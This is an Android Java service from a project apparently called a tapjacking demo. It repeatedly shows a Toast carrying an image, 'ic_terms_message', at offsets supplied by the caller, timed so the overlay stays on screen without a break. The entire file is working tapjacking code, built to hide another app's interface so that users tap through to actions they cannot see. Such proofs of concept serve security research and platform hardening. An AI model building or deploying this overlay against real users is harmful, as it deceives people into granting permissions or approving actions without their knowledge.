package com.example.tapjacking_android;

import java.util.Timer;
import java.util.TimerTask;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

public class ToastService extends Service {


    private int duration = Toast.LENGTH_LONG;
    private Context context;

    private Toast jam;
    private Timer t;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        t = new Timer();
        context = getApplicationContext();
        jam = new Toast(context);

        ImageView img = new ImageView(context);
        img.setImageResource(R.drawable.ic_terms_message);
        jam.setView(img);
    }

    @SuppressLint("NewApi")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        jam.setDuration(duration);
        Bundle e = intent.getExtras();
        int rep = 0;
        if (e != null) {
            // if the parameters are not passed they will be set to 0
            jam.setGravity(Gravity.TOP | Gravity.LEFT,
                    e.getInt("_com_example_tapjacking_leftOffset"),
                    e.getInt("_com_example_tapjacking_topOffset"));
            rep = e.getInt("_com_example_tapjacking_repetitionTime");
        }

        if (rep == 0)
            rep = 15000;

        if(rep<=5000)
        {
           toastTask();
           t.scheduleAtFixedRate(toastTask(), 0, rep);
        }
        if(rep>5000&&rep<=10000)
        {
            toastTask();
            t.scheduleAtFixedRate(toastTask(), 0, rep);
            t.scheduleAtFixedRate(toastTask(), duration, rep);
        }
        if(rep>=10000&&rep<=20000)
        {
            toastTask();
            t.scheduleAtFixedRate(toastTask(), 0, rep);
            t.scheduleAtFixedRate(toastTask(), duration, rep);
            t.scheduleAtFixedRate(toastTask(), 2*duration, rep);
            t.scheduleAtFixedRate(toastTask(), 3*duration, rep);
        }

        return super.onStartCommand(intent, flags, startId);

    }

    private TimerTask toastTask() {
        return new TimerTask() {
            @Override
            public void run() {
                //generateToast();
                jam.show();
            }
        };
    }

    /**
     * cancels all scheduled tasks and closes the toast
     */
    @Override
    public void onDestroy() {
        t.cancel();
        jam.cancel();
        super.onDestroy();
    }

}
